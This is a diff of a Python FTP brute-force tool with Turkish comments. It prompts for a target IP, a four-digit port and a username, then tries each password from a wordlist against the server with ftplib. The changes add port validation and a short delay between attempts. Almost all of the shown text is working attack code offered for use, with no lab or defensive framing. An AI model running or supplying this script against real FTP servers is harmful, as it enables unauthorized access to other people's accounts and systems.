@@ -12,12 +12,22 @@ print(r"""
 
 """)
 
-# Kullanıcıdan hedef IP ve port al
+# Target IP al
 target = input("📍 Target IP: ")
-port_input = input("📡 Target Port (default 21): ")
-port = int(port_input) if port_input else 21
 
-# Kullanıcı adı al (boşsa anonymous)
+# 4 haneli port iste
+while True:
+    port_input = input("📡 Target Port (4-digit, e.g. 2221): ")
+    if not port_input.isdigit() or len(port_input) != 4:
+        print("❌ Please enter a valid 4-digit port (1000–9999).")
+        continue
+    port = int(port_input)
+    if 1000 <= port <= 9999:
+        break
+    else:
+        print("❌ Port must be between 1000 and 9999.")
+
+# Kullanıcı adı al, boşsa anonymous
 username = input("👤 FTP Username (leave blank for anonymous): ")
 if username.strip() == "":
     username = "anonymous"
@@ -40,7 +50,7 @@ except FileNotFoundError:
 
 print(f"\n🚀 Starting FTP brute-force on {target}:{port} as {username} with {len(passwords)} passwords...\n")
 
-# Parola deneme
+# Parola deneme döngüsü
 for password in passwords:
     try:
         ftp = ftplib.FTP()
@@ -54,5 +64,7 @@ for password in passwords:
     except Exception as e:
         print(f"⚠️ Error: {e}")
         break
+    time.sleep(0.1)
+
 else:
     print("\n❌ Password not found in list.")
